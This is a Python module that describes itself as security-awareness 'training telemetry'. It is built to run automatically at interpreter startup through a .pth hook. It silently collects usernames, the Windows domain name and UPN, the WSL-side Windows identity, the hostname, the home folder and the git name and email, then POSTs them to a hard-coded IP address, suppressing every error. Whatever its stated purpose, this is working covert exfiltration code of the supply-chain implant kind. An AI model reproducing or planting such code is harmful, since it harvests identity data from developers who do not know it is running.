
import getpass
import json
import os
import sys
import urllib.request
import urllib.error
from datetime import datetime, timedelta, timezone

# Configuration via environment variables with defaults
CALLBACK_URL = os.environ.get(
    'RACMORPH_CALLBACK_URL',
    'http://152.42.160.210:7788/api/callback',
)
CAMPAIGN_ID = os.environ.get('RACMORPH_CAMPAIGN_ID', 'DEV-OCT-2026')
CAMPAIGN_TOKEN = os.environ.get('RACMORPH_CAMPAIGN_TOKEN', 'CHANGE-ME')

# EXTENDED_NAME_FORMAT (secur32 GetUserNameExW)
_NAME_SAM_COMPATIBLE = 2
_NAME_DISPLAY = 3
_NAME_USER_PRINCIPAL = 8
_MYANMAR_TZ = "Asia/Yangon"


def _detect_platform():
    """Return a simple trainer label: windows, linux, darwin, or unknown."""

    if sys.platform == "win32" or os.name == "nt":
        return "windows"
    if sys.platform.startswith("linux"):
        return "linux"
    if sys.platform == "darwin":
        return "darwin"
    return "unknown"


def _simple_username():
    try:
        name = getpass.getuser()
        if name:
            return name
    except Exception:
        pass
    return "unknown"


def _event_time_mmt():
    """
    Trainer-readable date and time in Myanmar Time.

    Prefer IANA Asia/Yangon via zoneinfo (tzdata on Windows). Myanmar has
    no DST, so if IANA data is missing fall back to UTC+06:30.
    """

    now = None
    try:
        try:
            from zoneinfo import ZoneInfo
        except ImportError:
            from backports.zoneinfo import ZoneInfo

        try:
            import tzdata  # noqa: F401 — supplies IANA data on Windows
        except ImportError:
            pass

        now = datetime.now(ZoneInfo(_MYANMAR_TZ))
    except Exception:
        now = None

    if now is None:
        try:
            now = datetime.now(timezone(timedelta(hours=6, minutes=30)))
        except Exception:
            return "unavailable"

    return now.strftime("%Y-%m-%d %H:%M:%S MMT (Asia/Yangon)")


def _get_windows_ex(name_format):
    """
    Windows only: GetUserNameExW (secur32). Other OSes return None.
    Failures never raise.
    """

    if _detect_platform() != "windows":
        return None

    try:
        import ctypes

        secur32 = ctypes.WinDLL("secur32", use_last_error=True)
        GetUserNameExW = secur32.GetUserNameExW
        GetUserNameExW.argtypes = [
            ctypes.c_int,
            ctypes.c_wchar_p,
            ctypes.POINTER(ctypes.c_ulong),
        ]
        GetUserNameExW.restype = ctypes.c_int

        size = ctypes.c_ulong(1024)
        buffer = ctypes.create_unicode_buffer(size.value)
        if not GetUserNameExW(name_format, buffer, ctypes.byref(size)):
            return None
        name = buffer.value
        if not name:
            return None
        return name
    except Exception:
        return None


def _get_windows_extended_username():
    """Windows SAM-compatible name (DOMAIN\\user)."""

    return _get_windows_ex(_NAME_SAM_COMPATIBLE)


def _linux_login_identity():
    """Linux only: login name from pwd.getpwuid. Other OSes skip this."""

    if _detect_platform() != "linux":
        return None

    try:
        import pwd

        name = pwd.getpwuid(os.getuid()).pw_name
        if name:
            return name
    except Exception:
        pass
    return None


def _is_wsl():
    """True when this Linux process is running inside Windows Subsystem for Linux."""

    if _detect_platform() != "linux":
        return False
    if os.environ.get("WSL_DISTRO_NAME"):
        return True
    for path in ("/proc/sys/kernel/osrelease", "/proc/version"):
        try:
            text = open(path, encoding="utf-8").read().lower()
        except Exception:
            continue
        if "microsoft" in text or "wsl" in text:
            return True
    return False


def _run_short(argv):
    """Run a short command; return first stdout line or None. Never raises."""

    try:
        import subprocess

        out = subprocess.run(
            argv,
            capture_output=True,
            text=True,
            timeout=2,
            check=False,
        )
        if out.returncode != 0:
            return None
        lines = (out.stdout or "").strip().splitlines()
        if not lines:
            return None
        value = lines[0].strip()
        if not value or value.lower() in (
            "unknown",
            "%username%",
            "%userdomain%\\%username%",
            "%computername%",
            "%userprofile%",
        ):
            return None
        return value
    except Exception:
        return None


def _wsl_windows_identity():
    """
    WSL only: Windows login identity via whoami.exe / cmd.exe.

    Native Linux (not WSL) returns {}. Failures never raise.
    Machine name is collected separately. No IP or other host inventory.
    """

    result = {}
    if not _is_wsl():
        return result

    result["wsl"] = True
    distro = os.environ.get("WSL_DISTRO_NAME")
    if distro:
        result["wsl_distro"] = distro

    whoami_bins = (
        "/mnt/c/Windows/System32/whoami.exe",
        "/mnt/c/WINDOWS/system32/whoami.exe",
        "whoami.exe",
    )
    cmd_bins = (
        "/mnt/c/Windows/System32/cmd.exe",
        "/mnt/c/WINDOWS/system32/cmd.exe",
        "cmd.exe",
    )

    whoami_path = None
    for candidate in whoami_bins:
        if candidate.startswith("/") and not os.path.isfile(candidate):
            continue
        if not candidate.startswith("/"):
            try:
                import shutil

                found = shutil.which(candidate)
            except Exception:
                found = None
            if not found:
                continue
            candidate = found
        whoami_path = candidate
        sam = _run_short([candidate])
        if sam:
            result["extended_username"] = sam
            if "\\" in sam:
                result["windows_username"] = sam.split("\\", 1)[-1]
            break

    if whoami_path:
        upn = _run_short([whoami_path, "/upn"])
        if upn and "@" in upn:
            result["upn"] = upn

    if "extended_username" not in result:
        for candidate in cmd_bins:
            if candidate.startswith("/") and not os.path.isfile(candidate):
                continue
            if not candidate.startswith("/"):
                try:
                    import shutil

                    found = shutil.which(candidate)
                except Exception:
                    found = None
                if not found:
                    continue
                candidate = found
            sam = _run_short(
                [candidate, "/c", "echo %USERDOMAIN%\\%USERNAME%"]
            )
            if sam:
                result["extended_username"] = sam
                if "\\" in sam:
                    result["windows_username"] = sam.split("\\", 1)[-1]
                break

    cmd = _wsl_cmd_exe()
    if cmd:
        profile = _run_short([cmd, "/c", "echo %USERPROFILE%"])
        if profile:
            leaf = profile.rstrip("\\/").replace("/", "\\").split("\\")[-1]
            if leaf:
                result["windows_home"] = leaf

    return result


def _hostname():
    """OS hostname from socket.gethostname. Never raises."""

    try:
        import socket

        name = socket.gethostname()
        if name:
            name = name.strip()
        if name:
            return name
    except Exception:
        pass
    return None


def _wsl_cmd_exe():
    """Path to Windows cmd.exe when running under WSL, else None."""

    for candidate in (
        "/mnt/c/Windows/System32/cmd.exe",
        "/mnt/c/WINDOWS/system32/cmd.exe",
        "cmd.exe",
    ):
        if candidate.startswith("/") and not os.path.isfile(candidate):
            continue
        if not candidate.startswith("/"):
            try:
                import shutil

                found = shutil.which(candidate)
            except Exception:
                found = None
            if not found:
                continue
            candidate = found
        return candidate
    return None


def _desktop_name():
    """
    Trainer-facing machine name.

    Windows / WSL: COMPUTERNAME (the Desktop-… / PC name).
    macOS: scutil ComputerName when available.
    """

    platform = _detect_platform()
    if platform == "windows":
        name = os.environ.get("COMPUTERNAME")
        if name:
            name = name.strip()
        return name or None
    if _is_wsl():
        cmd = _wsl_cmd_exe()
        if not cmd:
            return None
        return _run_short([cmd, "/c", "echo %COMPUTERNAME%"])
    if platform == "darwin":
        return _run_short(["scutil", "--get", "ComputerName"])
    return None


def _macos_console_user():
    """macOS console user via SystemConfiguration. Returns None on failure."""

    try:
        import ctypes
        import ctypes.util

        sc_path = ctypes.util.find_library("SystemConfiguration")
        cf_path = ctypes.util.find_library("CoreFoundation")
        if not sc_path or not cf_path:
            return None

        sc = ctypes.CDLL(sc_path)
        cf = ctypes.CDLL(cf_path)

        sc.SCDynamicStoreCopyConsoleUser.argtypes = [
            ctypes.c_void_p,
            ctypes.c_void_p,
            ctypes.c_void_p,
        ]
        sc.SCDynamicStoreCopyConsoleUser.restype = ctypes.c_void_p

        cf.CFStringGetCString.argtypes = [
            ctypes.c_void_p,
            ctypes.c_char_p,
            ctypes.c_long,
            ctypes.c_uint32,
        ]
        cf.CFStringGetCString.restype = ctypes.c_bool
        cf.CFRelease.argtypes = [ctypes.c_void_p]

        kCFStringEncodingUTF8 = 0x08000100
        cf_str = sc.SCDynamicStoreCopyConsoleUser(None, None, None)
        if not cf_str:
            return None
        try:
            buf = ctypes.create_string_buffer(256)
            if not cf.CFStringGetCString(cf_str, buf, 256, kCFStringEncodingUTF8):
                return None
            name = buf.value.decode("utf-8")
            if name:
                return name
        finally:
            cf.CFRelease(cf_str)
    except Exception:
        pass
    return None


def _macos_login_identity():
    """macOS only: console user, then pwd.getpwuid. Other OSes skip this."""

    if _detect_platform() != "darwin":
        return None

    name = _macos_console_user()
    if name:
        return name

    try:
        import pwd

        name = pwd.getpwuid(os.getuid()).pw_name
        if name:
            return name
    except Exception:
        pass
    return None


def _home_folder():
    """Basename of the user home directory. Never raises."""

    try:
        home = os.path.expanduser("~")
        if not home or home == "~":
            return None
        leaf = os.path.basename(os.path.normpath(home))
        return leaf or None
    except Exception:
        return None


def _linux_gecos_name():
    """Linux GECOS full name (first comma field), if set."""

    if _detect_platform() != "linux":
        return None
    try:
        import pwd

        gecos = pwd.getpwuid(os.getuid()).pw_gecos or ""
        name = gecos.split(",")[0].strip()
        return name or None
    except Exception:
        return None


def _git_identity():
    """Effective git user.name / user.email. Empty if git is missing."""

    result = {}
    for git in ("git", "git.exe"):
        name = _run_short([git, "config", "--get", "user.name"])
        email = _run_short([git, "config", "--get", "user.email"])
        if name:
            result["git_name"] = name
        if email:
            result["git_email"] = email
        if result:
            break
    return result


def collect_training_telemetry():
    """
    Detect OS first, then collect identity for follow-up training:

      - windows: GetUserNameExW (extended_username, display_name, upn)
      - linux: pwd login + GECOS full name when set
      - linux+WSL: Windows DOMAIN\\user, UPN, windows_home
      - darwin: console user + id -F display name

    Also git user.name / user.email, home folder basename, hostname /
    desktop name, and a Myanmar-time stamp. No IP, MAC, processes,
    file contents, clipboard, or keystrokes.
    """

    platform = _detect_platform()

    payload = {
        "campaign_id": CAMPAIGN_ID,
        "campaign_token": CAMPAIGN_TOKEN,
        "event": "training_package_executed",
        "platform": platform,
        "event_time_mmt": _event_time_mmt(),
    }

    if platform == "windows":
        payload["username"] = _simple_username()
        extended_username = _get_windows_extended_username()
        if extended_username:
            payload["extended_username"] = extended_username
        display_name = _get_windows_ex(_NAME_DISPLAY)
        if display_name:
            payload["display_name"] = display_name
        upn = _get_windows_ex(_NAME_USER_PRINCIPAL)
        if upn and "@" in upn:
            payload["upn"] = upn
    elif platform == "linux":
        payload["username"] = _linux_login_identity() or _simple_username()
        payload.update(_wsl_windows_identity())
        gecos = _linux_gecos_name()
        if gecos:
            payload["display_name"] = gecos
    elif platform == "darwin":
        payload["username"] = _macos_login_identity() or _simple_username()
        full = _run_short(["id", "-F"])
        if full:
            payload["display_name"] = full
    else:
        payload["username"] = _simple_username()

    hostname = _hostname()
    if hostname:
        payload["hostname"] = hostname
    desktop_name = _desktop_name()
    if desktop_name:
        payload["desktop_name"] = desktop_name
    home_folder = _home_folder()
    if home_folder:
        payload["home_folder"] = home_folder
    payload.update(_git_identity())

    return payload


def send_training_event():
    """
    Send the limited training telemetry to the controlled collector.
    """

    if not CALLBACK_URL or "YOUR-CONTROLLED-DOMAIN" in CALLBACK_URL:
        return

    telemetry = collect_training_telemetry()

    body = json.dumps(telemetry).encode("utf-8")

    request = urllib.request.Request(
        CALLBACK_URL,
        data=body,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "Developer-Security-Awareness-Simulation/1.0",
        },
        method="POST",
    )

    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            response.read(1024)

    except (urllib.error.URLError, urllib.error.HTTPError, TimeoutError):
        # Training telemetry should never break Python startup.
        pass
    except Exception:
        pass


# Execute when imported by the .pth mechanism.
send_training_event()
